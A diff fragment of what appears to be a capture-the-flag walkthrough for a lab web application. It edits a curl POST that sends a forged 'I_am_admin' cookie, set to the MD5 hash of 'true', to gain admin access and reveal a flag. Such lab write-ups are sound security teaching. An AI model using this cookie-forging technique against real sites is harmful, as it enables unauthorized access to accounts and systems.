@@ -29,9 +29,7 @@ Generate the MD5 hash for true: b326b5062b2f0e69046810717534cb09
 Step 5: Send the POST Request
 Use a tool like curl or Postman to send the POST request with the modified cookie.
 curl -X POST http://192.168.1.32/?page=recover \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" \
-  --data "mail=webmaster@borntosec.com&Submit=Submit"
+  -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09"
 
 Step 7: Analyze the Response
 After sending the POST request with the modified cookie, the response contain an altert that displays the flag:
